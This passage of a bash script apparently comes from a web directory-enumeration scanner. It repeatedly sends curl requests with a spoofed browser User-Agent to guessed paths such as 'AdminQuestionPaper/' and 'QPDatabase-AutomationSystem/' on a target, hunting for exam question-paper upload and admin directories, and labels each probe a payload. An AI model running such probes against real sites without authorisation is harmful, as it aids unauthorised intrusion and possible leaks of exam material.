code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
